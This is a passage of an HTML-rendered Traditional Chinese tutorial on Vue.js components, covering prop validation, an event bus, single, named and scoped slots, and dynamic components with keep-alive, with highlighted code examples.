<span class=\"token punctuation\">{</span>\n  props<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n  computed<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function-variable function\">myName</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\" is a girl\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n  template<span class=\"token operator\">:</span> <span class=\"token string\">'&lt;p>{{ myName }}&lt;/p>'</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></code></pre><h4 id=\"prop-validation\">Prop Validation</h4>\n<pre class=\"language-js\"><code class=\"language-js\">Vue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"child\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  props<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    id<span class=\"token operator\">:</span> Number<span class=\"token punctuation\">,</span>\n    name<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>String<span class=\"token punctuation\">,</span> Number<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    age<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n      <span class=\"token keyword\">default</span><span class=\"token operator\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token function-variable function\">validator</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> value <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n      required<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><ul>\n<li><code>type</code>：資料型態：\n├ <code>String</code>\n├ <code>Number</code>\n├ <code>Boolean</code>\n├ <code>Function</code>\n├ <code>Object</code>\n├ <code>Array</code>\n├ <code>Symbol</code>\n└ 亦可是自訂的建構式函式，使用 <code>instanceof</code> 檢測</li>\n<li><code>default</code>：預設值</li>\n<li><code>validator</code>：檢驗屬性資料 expression</li>\n<li><code>required</code>：該屬性是否必要</li>\n</ul>\n<h4 id=\"events-up\"><code>Events up</code></h4>\n<p>一個 Vue Instance 的事件介面（Event Interface）實作方式包含以下兩種：</p>\n<ul>\n<li>使用 <code>$on(eventName)</code> 監聽事件</li>\n<li>使用 <code>$emit(eventName)</code> 觸發事件</li>\n</ul>\n<p>如果是兩個子組件要互相溝通，因為組件都是獨立運作在自己作用域的，\n我們可以透過創建一個空的 Vue Instance 作為事件的總管理線。</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> bus <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nbus<span class=\"token punctuation\">.</span><span class=\"token function\">$emit</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"id-selected\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nbus<span class=\"token punctuation\">.</span><span class=\"token function\">$on</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"id-selected\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">id</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// content</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>但這只能適用於小型網站應用開發，中大型網站官方推薦使用 Vuex，它是一個狀態管理模式。</p>\n<h3 id=\"slot-插槽\">Slot 插槽</h3>\n<ul>\n<li>將 <code>&lt;slot&gt;&lt;/slot&gt;</code> 寫進子組件下的 <code>template</code> 內</li>\n<li>可以放入父組件所指定的資料</li>\n</ul>\n<ol>\n<li>Single Slot\n<code>&lt;slot&gt;&lt;/slot&gt;</code> 會去接收父組件所指定的資料，\n如果沒有指令資料，則會顯示原本寫在子組件中 <code>&lt;slot&gt;&lt;/slot&gt;</code> 內的預設資料。</li>\n</ol>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>當父組件有指定資料時：<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>child</span><span class=\"token punctuation\">></span></span>HELLO WORLD<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>child</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>當父組件沒有指定資料時：<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>child</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>child</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-js\"><code class=\"language-js\">Vue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"child\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  template<span class=\"token operator\">:</span> <span class=\"token string\">\"&lt;span>&lt;slot>This is a default single slot.&lt;/slot>&lt;/span>\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><ol start=\"2\">\n<li>Named Slot\n為 slot 定義名稱，父組件就可以指令要在哪一個 slot 放入指定對應資料</li>\n</ol>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>child</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">slot</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>header<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Header<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>Main Content<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">slot</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>footer<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Footer<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n    >\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>child</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-js\"><code class=\"language-js\">Vue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"child\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  template<span class=\"token operator\">:</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;div>\n    &lt;header>\n      &lt;slot name=\"header\">&lt;/slot>\n    &lt;/header>\n    &lt;main>\n      &lt;slot>&lt;/slot>\n    &lt;/main>\n    &lt;footer>\n      &lt;slot name=\"footer\">&lt;/slot>\n    &lt;/footer>\n  &lt;/div></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><ol start=\"3\">\n<li>Scoped Slots\n如果我們在父組件的元素與 slot 做一些設定，slot 就可以將資料傳遞到父組件，\n跟上一篇使用過的 props 傳遞資料的用法很像。</li>\n</ol>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>child</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>template</span> <span class=\"token attr-name\">scope</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>props<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>{{ props.text }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>template</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>child</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-js\"><code class=\"language-js\">Vue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"child\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  template<span class=\"token operator\">:</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;div>\n    &lt;slot text=\"This is a text from slot.\">&lt;/slot>\n  &lt;/div></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"dynamic-components\">Dynamic Components</h3>\n<p>可以透過綁定（<code>v-bind</code>）組件的 <code>is</code> 屬性決定要載入哪個組件，實現動態綁定與切換</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>navbar<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">@click</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>changeTab(<span class=\"token punctuation\">'</span>home<span class=\"token punctuation\">'</span>)<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">@click</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>changeTab(<span class=\"token punctuation\">'</span>about<span class=\"token punctuation\">'</span>)<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">@click</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>changeTab(<span class=\"token punctuation\">'</span>contact<span class=\"token punctuation\">'</span>)<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>hr</span> <span class=\"token punctuation\">/></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>component</span> <span class=\"token attr-name\">:is</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>currentView<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>component</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-js\"><code class=\"language-js\">Vue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"home\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  template<span class=\"token operator\">:</span> <span class=\"token string\">\"&lt;div>This is home page.&lt;/div>\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nVue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"about\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  template<span class=\"token operator\">:</span> <span class=\"token string\">\"&lt;div>This is about page.&lt;/div>\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nVue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"contactn\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  template<span class=\"token operator\">:</span> <span class=\"token string\">\"&lt;div>This is contact page.&lt;/div>\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    currentView<span class=\"token operator\">:</span> <span class=\"token string\">\"home\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  methods<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function-variable function\">changeTab</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">v</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>currentView <span class=\"token operator\">=</span> v<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>區域組件寫法：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    currentView<span class=\"token operator\">:</span> <span class=\"token string\">\"home\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  methods<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function-variable function\">changeTab</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">v</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>currentView <span class=\"token operator\">=</span> v<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  components<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    home<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      template<span class=\"token operator\">:</span> <span class=\"token string\">\"&lt;div>This is Home page.&lt;/div>\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    about<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      template<span class=\"token operator\">:</span> <span class=\"token string\">\"&lt;div>This is About page.&lt;/div>\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    contact<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      template<span class=\"token operator\">:</span> <span class=\"token string\">\"&lt;div>This is Contact page.&lt;/div>\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"用-keep-alive-暫存動態組件的狀態\">用 <code>keep-alive</code> 暫存動態組件的狀態</h4>\n<p>如果希望在動態組件切換的時候，可以保留原本的資料或狀態，暫存在記憶體中，避免重新渲染\n這時候可以使用 <code>keep-alive</code></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>navbar<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">@click</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>changeTab(<span class=\"token punctuation\">'</span>home<span class=\"token punctuation\">'</span>)<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Home<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">@click</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>changeTab(<span class=\"token punctuation\">'</span>about<span class=\"token punctuation\">'</span>)<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>About<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">@click</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>changeTab(<span class=\"token punctuation\">'</span>contact<span class=\"token punctuation\">'</span>)<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Contact<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>hr</span> <span class=\"token punctuation\">/></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>component</span> <span class=\"token attr-name\">:is</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>currentView<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>component</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>keep-alive</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>component</span> <span class=\"token attr-name\">:is</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>currentView<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>component</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>keep-alive</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-js\"><code class=\"language-js\">Vue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"home\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  template<span class=\"token operator\">:</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;div>This is Home page.\n    &lt;p>&lt;input type=\"text\" placeholder=\"Type your name here...\">&lt;/p>\n  &lt;/div></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nVue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"about\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  template<span class=\"token operator\">:</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;div>This is About page.\n    &lt;p>&lt;input type=\"text\" placeholder=\"Type your name here...\">&lt;/p>\n  &lt;/div></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nVue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"contact\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  template<span class=\"token operator\">:</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;div>This is 